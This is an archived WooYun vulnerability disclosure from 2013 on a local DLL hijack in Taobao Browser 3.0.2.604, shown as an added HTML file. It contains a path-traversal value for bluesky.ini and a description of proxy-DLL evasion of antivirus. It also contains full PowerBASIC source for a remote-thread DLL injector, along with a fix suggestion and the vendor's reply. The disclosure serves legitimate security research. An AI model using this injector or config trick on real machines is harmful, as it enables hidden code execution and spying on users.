@@ -1,0 +1,398 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		淘宝浏览器3.0.2.604修改配置可能导致本地的DLL注入  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		淘宝浏览器3.0.2.604修改配置可能导致本地的DLL注入  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blast">blast</a> 
+</li><li>提交时间：		2013-06-12 09:33</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-06-17：	细节向第三方安全合作伙伴开放<br/>
+									2013-06-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-04：	细节向普通白帽子公开<br/>
+									2013-07-24：	细节向实习白帽子公开<br/>
+									2013-09-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">淘宝浏览器3.0.2.604(2013.3.20)修改配置文件可能导致本地的DLL注入</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">家里电脑上的，淘宝浏览器3.0.2.604(2013.3.20)版本，程序启动时会加载框架bluesky.dll，这个文件的路径，程序是通过bluesky.ini来确定的，所以修改配置文件：<br />
+<br />
+<br />
+<br />
+</p><pre><code>\TaoBrowser\bluesky.ini</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+的内容为<br />
+<br />
+<br />
+<br />
+</p><pre><code>[Common]<br />
+Version = ../../../../../../../../1111</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+即会让程序启动时加载（假设安装路径为c:\taobao\）c:\taobao\..\..\..\..\..\..\..\1111\bluesky.dll，也即c:\1111\bluesky.dll。<br />
+<br />
+<br />
+<br />
+当然不局限于这一个DLL，因为覆盖了这个DLL之后，整个窗体就启动不了了。这个文件夹下面还有很多文件，通过检查与功能之间的关联，也可以通过覆盖某个DLL使得用户执行某个功能时触发恶意木马（例如更新功能的AliUpdate.dll）<br />
+<br />
+<br />
+<br />
+假设bluesky.dll是恶意木马，那么用户打开淘宝浏览器之后，这个文件就会被浏览器加载，如果杀毒软件并没有它的定义的话，这儿杀毒软件默认是放行的（可能是因为白加黑，家里机器使用的是360杀毒，包括注入也没有提示）.<br />
+<br />
+<br />
+<br />
+DLL注入后将可以监视用户的动作，执行其它危险操作,etc...<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+漏洞的可能利用方法：配置文件的修改者可以是一个会1、释放文件，2、修改配置的木马。这两个动作都很接近正常程序的行为，所以一般不会达到触发杀毒软件主动防御的行为分值。<br />
+<br />
+而伪造部分，例如想伪造的是Alixxx.dll，攻击者可以构造一个假的Alixxx.dll，输出表和Alixxx.dll一样，等浏览器调用假的Alixxx.dll时，由于真的也在那儿，假的Alixxx.dll可以调用真的Alixxx.dll的函数并把结果返回给浏览器，同时也可以执行自己的代码<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">dll被载入TAOBROWSER.EXE<br />
+<br />
+</p><p class="detail"><a href="../images/1123223955f3b19c17c2950de65410fe1d1ee0ae.jpg" target="_blank"><img src="../images/1123223955f3b19c17c2950de65410fe1d1ee0ae.jpg" alt="QQ图片20130611231917.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+DLL提示的注入窗口：<br />
+<br />
+</p><p class="detail"><a href="../images/11232312e9c5e4b55f4800479e86d567868a0efd.jpg" target="_blank"><img src="../images/11232312e9c5e4b55f4800479e86d567868a0efd.jpg" alt="QQ图片20130611231926.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+注入成功（-1=失败,0=成功）：<br />
+<br />
+</p><p class="detail"><a href="../images/11232334828089253317d5a8a83b911a4c2d76f5.jpg" target="_blank"><img src="../images/11232334828089253317d5a8a83b911a4c2d76f5.jpg" alt="1233.JPG" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+由于是老妈用的机器，所以没装什么编译程序，临时下了个POWERBASIC的程序，代码用的以前写的，所以功能简陋，只是为了测试一下：<br />
+<br />
+</p><pre><code>#COMPILE DLL<br />
+#DIM ALL<br />
+<br />
+%USEMACROS = 1<br />
+#INCLUDE &quot;D:\PowerBasic\MAINDIR\WinAPI\Win32API.inc&quot;<br />
+<br />
+GLOBAL ghInstance AS DWORD<br />
+&#039;-- INJECT.INC --------------------------------------------------------------<br />
+DECLARE FUNCTION Get_hModule(BYVAL PID AS DWORD, DllPath$) AS DWORD<br />
+DECLARE FUNCTION Inject_DLL(BYVAL PID AS DWORD, DllPath$) AS LONG<br />
+DECLARE FUNCTION Eject_DLL(BYVAL PID AS DWORD, BYVAL hModule AS DWORD) AS LONG<br />
+<br />
+&#039;-- Declares not found in WIN32API.INC<br />
+DECLARE FUNCTION EnumProcessModules LIB &quot;PSAPI.DLL&quot; ALIAS &quot;EnumProcessModules&quot; _<br />
+      (BYVAL hProcess AS DWORD, hModule AS DWORD, _<br />
+       BYVAL cb AS DWORD, cbNeeded AS DWORD) AS DWORD<br />
+<br />
+DECLARE FUNCTION GetModuleFileNameEx LIB &quot;PSAPI.DLL&quot; ALIAS &quot;GetModuleFileNameExA&quot; _<br />
+      (BYVAL hProcess AS DWORD, BYVAL hModule AS DWORD, _<br />
+       Filename AS ASCIIZ, BYVAL nSize AS DWORD) AS DWORD<br />
+<br />
+<br />
+&#039;====================<br />
+FUNCTION Get_hModule(BYVAL PID AS DWORD, DllPath$) AS DWORD<br />
+&#039;-- Returns handle to running module specified in DllPath$, or zero if not found<br />
+&#039;-- PID = process ID of running process; DllPath$ = path+filename of DLL<br />
+REGISTER i&amp;, result&amp;<br />
+LOCAL  cb, cbNeeded, nModules AS LONG, hProcess, found, hModules() AS DWORD<br />
+LOCAL dll$, ModuleName AS ASCIIZ * %MAX_PATH<br />
+<br />
+hProcess = OpenProcess(%PROCESS_QUERY_INFORMATION OR %PROCESS_VM_READ, %FALSE, PID)<br />
+IF hProcess THEN<br />
+   cb = 100<br />
+   DO<br />
+      REDIM hModules(1 TO cb \ 4)<br />
+      result = EnumProcessModules(hProcess, hModules(1), cb, cbNeeded)<br />
+      IF result = 0 THEN &#039;call failed<br />
+         cbNeeded = 0 : EXIT DO<br />
+      END IF<br />
+      IF cb &gt; cbNeeded THEN EXIT DO<br />
+      cb = cb * 2<br />
+   LOOP<br />
+   nModules = cbNeeded \ 4<br />
+   DLL = UCASE$(DllPath$)<br />
+   FOR i = 1 TO nModules<br />
+      result = GetModuleFileNameEx(hProcess, hModules(i), _<br />
+                                   ModuleName, SIZEOF(ModuleName))<br />
+      IF result THEN<br />
+         IF UCASE$(RTRIM$(ModuleName,$NUL)) = DLL THEN<br />
+            found = hModules(i) : EXIT FOR<br />
+         END IF<br />
+      END IF<br />
+   NEXT i<br />
+   CloseHandle hProcess<br />
+END IF &#039;hProcess<br />
+<br />
+FUNCTION = found<br />
+END FUNCTION<br />
+<br />
+&#039;====================<br />
+FUNCTION Inject_DLL(BYVAL PID AS DWORD, DllPath$) AS LONG<br />
+REGISTER hProcess&amp;, hThread&amp;<br />
+LOCAL ecode&amp;, pLoadLibraryA, pRemoteBuffer AS DWORD<br />
+<br />
+ecode = -1  &#039;default to error<br />
+hProcess = OpenProcess(%PROCESS_CREATE_THREAD OR %PROCESS_QUERY_INFORMATION OR _<br />
+                       %PROCESS_VM_OPERATION  OR %PROCESS_VM_READ OR _<br />
+                       %PROCESS_VM_WRITE, %FALSE, PID)<br />
+IF hProcess THEN<br />
+   pLoadLibraryA = GetProcAddress(GetModuleHandle(&quot;Kernel32&quot;), &quot;LoadLibraryA&quot;)<br />
+   pRemoteBuffer = VirtualAllocEx(hProcess, BYVAL %NULL, LEN(DllPath$), _<br />
+                                  %MEM_COMMIT, %PAGE_READWRITE)<br />
+   IF pRemoteBuffer AND pLoadLibraryA THEN<br />
+      IF WriteProcessMemory(BYVAL hProcess, BYVAL pRemoteBuffer, _<br />
+                            BYVAL STRPTR(DllPath$), LEN(DllPath$), %NULL) THEN<br />
+         hThread = CreateRemoteThread(BYVAL hProcess, BYVAL %NULL, 0&amp;, _<br />
+                                      BYVAL pLoadLibraryA, BYVAL pRemoteBuffer, _<br />
+                                      0, %NULL)<br />
+         IF hThread THEN<br />
+            WaitForSingleObject hThread, %INFINITE<br />
+            CloseHandle hThread<br />
+            ecode = 0<br />
+         END IF<br />
+      END IF<br />
+      VirtualFreeEx hProcess, pRemoteBuffer, 0, %MEM_RELEASE<br />
+   END IF &#039;pRemoteBuffer AND pLoadLibraryA<br />
+   CloseHandle hProcess<br />
+END IF &#039;hProcess<br />
+<br />
+FUNCTION = ecode<br />
+END FUNCTION<br />
+<br />
+&#039;====================<br />
+FUNCTION Eject_DLL(BYVAL PID AS DWORD, BYVAL hModule AS DWORD) AS LONG<br />
+REGISTER hProcess&amp;, hThread&amp;<br />
+LOCAL ecode&amp;, pFreeLibrary, pRemoteBuffer AS DWORD<br />
+<br />
+ecode = -1  &#039;default to error<br />
+hProcess = OpenProcess(%PROCESS_CREATE_THREAD OR %PROCESS_QUERY_INFORMATION OR _<br />
+                       %PROCESS_VM_OPERATION  OR %PROCESS_VM_READ OR _<br />
+                       %PROCESS_VM_WRITE, %FALSE, PID)<br />
+IF hProcess THEN<br />
+   pFreeLibrary = GetProcAddress(GetModuleHandle(&quot;Kernel32&quot;), &quot;FreeLibrary&quot;)<br />
+   IF pFreeLibrary THEN<br />
+      hThread = CreateRemoteThread(BYVAL hProcess, BYVAL %NULL, 0&amp;, _<br />
+                                   BYVAL pFreeLibrary, BYVAL hModule, 0, %NULL)<br />
+      IF hThread THEN<br />
+         WaitForSingleObject hThread, %INFINITE<br />
+         CloseHandle hThread<br />
+         ecode = 0<br />
+      END IF<br />
+   END IF<br />
+   CloseHandle hProcess<br />
+END IF &#039;hProcess<br />
+<br />
+FUNCTION = ecode<br />
+END FUNCTION<br />
+&#039;-- END INJECT.INC ----------------------------------------------------------<br />
+<br />
+<br />
+FUNCTION LIBMAIN (BYVAL hInstance   AS LONG, _<br />
+                  BYVAL fwdReason   AS LONG, _<br />
+                  BYVAL lpvReserved AS LONG) AS LONG<br />
+    DIM sFileName AS ASCIIZ * 256<br />
+    DIM sModuleFilePath AS ASCIIZ * %MAX_PATH<br />
+    DIM sNameCut AS ASCIIZ * %MAX_PATH<br />
+    <br />
+    LOCAL ecode&amp;, hmodule, pid AS DWORD<br />
+    LOCAL DllPath$, exepath AS ASCIIZ * %MAX_PATH<br />
+<br />
+    GetModuleFileName GetModuleHandle(&quot;&quot;), exepath, SIZEOF(exepath)<br />
+    DllPath = &quot;D:\PowerBasic\MAINDIR\t2.dll&quot;<br />
+<br />
+    IF pid = 0 THEN pid = VAL(INPUTBOX$(&quot;Enter target process id&quot;, DllPath))<br />
+    IF pid = 0 THEN EXIT FUNCTION<br />
+<br />
+    hModule = Get_hModule(pid, DllPath)<br />
+    IF hModule THEN<br />
+       MSGBOX &quot;已被注入，尝试清除中&quot;,,DllPath<br />
+       ecode = Eject_DLL(pid, hModule)<br />
+       MSGBOX &quot;Final eject ecode:&quot; + STR$(ecode),,DllPath<br />
+    ELSE<br />
+       MSGBOX &quot;未被注入，尝试注入中&quot;,,DllPath<br />
+       ecode = Inject_DLL(pid, DllPath)<br />
+       MSGBOX &quot;Final inject ecode:&quot; + STR$(ecode),,DllPath<br />
+    END IF<br />
+    <br />
+    <br />
+    <br />
+  &#039;  SELECT CASE fwdReason<br />
+  &#039;  CASE %DLL_PROCESS_ATTACH<br />
+  &#039;      ghInstance = hInstance<br />
+  &#039;      FUNCTION = 1   &#039;success!<br />
+        GetModuleFileName(hInstance, sFileName, 255)<br />
+        CALL GetModuleFileName( CDWD(&amp;H0), sModuleFilePath, CDWD(%MAX_PATH) )<br />
+       &#039; sNameCut = Parse$( sModuleFilePath, &quot;\&quot;, ParseCount(sModuleFilePath, &quot;\&quot;) )<br />
+       &#039; sModuleFilePath = RTrim$( sModuleFilePath, sNameCut )<br />
+        MSGBOX &quot;The dll&quot; + sFileName + &quot; is being attached into : &quot; + sModuleFilePath<br />
+        &#039;FUNCTION = 0   &#039;failure!  This will prevent the EXE from running.<br />
+<br />
+&#039;    CASE %DLL_PROCESS_DETACH<br />
+&#039;         FUNCTION = 1   &#039;success!<br />
+&#039;     CASE %DLL_THREAD_ATTACH<br />
+&#039;         FUNCTION = 1   &#039;success!<br />
+&#039;    CASE %DLL_THREAD_DETACH<br />
+&#039;         FUNCTION = 1   &#039;success!<br />
+ &#039;   END SELECT<br />
+<br />
+END FUNCTION</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+DLL以及设置<br />
+<br />
+</p><p class="detail"><a href="../images/1123253414522a80fe9f3f516d8f7697982ba00a.jpg" target="_blank"><img src="../images/1123253414522a80fe9f3f516d8f7697982ba00a.jpg" alt="1333.JPG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤好../这种相对路径的字符 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blast" title="blast">blast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-025715" title="淘宝浏览器3.0.2.604修改配置可能导致本地的DLL注入">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-06-14 11:30</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你对我们的支持与关注，该问题我们正在修复~ ^_^</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="25715";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
